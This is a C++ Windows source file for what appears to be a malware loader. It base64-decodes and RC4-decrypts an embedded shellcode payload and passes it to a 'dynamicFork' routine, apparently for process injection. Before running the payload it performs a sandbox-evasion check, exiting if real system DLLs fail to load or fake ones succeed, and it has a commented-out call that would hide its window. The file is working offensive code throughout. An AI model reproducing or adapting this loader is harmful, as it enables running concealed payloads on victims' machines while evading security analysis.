#include <Windows.h>
#include <iostream>
#include "rc4Algorithm.h"
#include "shellc.h"
#include <fstream>
#include "dynamicFork.h"


#define sizeOfArray(arr) (sizeof(arr)/sizeof(arr[0]))
#define ENC_DATA_SIZE (sizeOfArray(encData))
#define MEMRESERVED 100000000


#pragma comment(lib, "Crypt32.lib")

std::pair<char*, DWORD> decryptData(unsigned char encBufferInput[], const char* key)  {
	DWORD *decodedSize = new DWORD();
	CryptStringToBinaryA((char*)encBufferInput, ENC_DATA_SIZE, CRYPT_STRING_BASE64, NULL, decodedSize, NULL, NULL);

	char* decodedBuffer = new char[*decodedSize]();

	CryptStringToBinaryA((char*)encBufferInput, ENC_DATA_SIZE, CRYPT_STRING_BASE64, (BYTE*)decodedBuffer, decodedSize, NULL, NULL);

	rc4Algorithm rc4;

	char* decryptedBufferOutput = new char[*decodedSize]();

	rc4.crypt(decodedBuffer, key, strlen(key), *decodedSize, decryptedBufferOutput);

	delete[] decodedBuffer;

	return std::make_pair(decryptedBufferOutput, *decodedSize);

}

BOOL checkLoadDLL() {
   
    char const* realDLL[] = { "Kernel32.DLL", "networkexplorer.DLL", "NlsData0000.DLL" };
    char const* falseDLL[] = { "NetProjW.DLL", "Ghofr.DLL", "fg122.DLL" };
    HMODULE hInstLib;
    for (int i = 0; i < 3; i++) {
        hInstLib = LoadLibraryA(realDLL[i]);
        if (hInstLib == nullptr) {
           
            return TRUE;
        }
        FreeLibrary(hInstLib);
    }

    for (int i = 0; i < 3; i++) {
        hInstLib = LoadLibraryA(falseDLL[i]);
        if (hInstLib != nullptr) {

            return TRUE;
        }
    }
    return FALSE;
}





int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hpInstance, LPSTR nCmdLine, int iCmdShow){

	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (checkLoadDLL()) {
		return 0;
	}
	
	std::pair <char*, DWORD> decOut;
	decOut = decryptData(encData, key);

	dynamicFork dyn(decOut.first);
	
	/*for (int i = 0; i < decOut.second; i++) {
		printf("%02hhX ", decOut.first[i]);
	}

	*/
	TerminateProcess(GetCurrentProcess(), 0);
	return 0;
}